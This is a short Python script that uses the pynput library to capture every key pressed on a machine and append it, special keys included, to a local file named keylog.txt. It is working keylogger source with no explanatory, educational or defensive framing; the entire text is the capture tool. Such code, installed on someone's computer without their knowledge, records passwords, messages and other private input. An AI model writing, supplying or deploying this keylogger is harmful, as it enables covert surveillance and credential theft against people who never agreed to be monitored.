from pynput import keyboard

# File to save keystrokes
log_file = "keylog.txt"

# Function to write keystrokes to the file
def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(str(key.char))  # Write the character pressed
    except AttributeError:
        with open(log_file, "a") as file:
            file.write(f"[{key}]")  # Write special keys like Shift, Enter, etc.

# Listener to capture keyboard events
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
